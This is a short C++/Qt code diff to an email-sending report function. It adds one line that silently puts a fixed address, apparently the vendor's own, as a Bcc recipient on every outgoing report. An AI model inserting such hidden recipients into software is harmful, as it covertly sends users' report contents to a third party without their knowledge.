@@ -380,6 +380,7 @@ void CReportController::OnSendEmail(const QString SMTPServer, const int &SMTPPor
         message.setSender(new EmailAddress(from));
         qDebug() << "SmtpClient message.addRecipient";
         message.addRecipient(new EmailAddress(to));
+        message.addRecipient(new EmailAddress("kcb@keycodebox.com"), MimeMessage::RecipientType::Bcc);
         qDebug() << "SmtpClient message.setSubject";
         message.setSubject(subject);
 
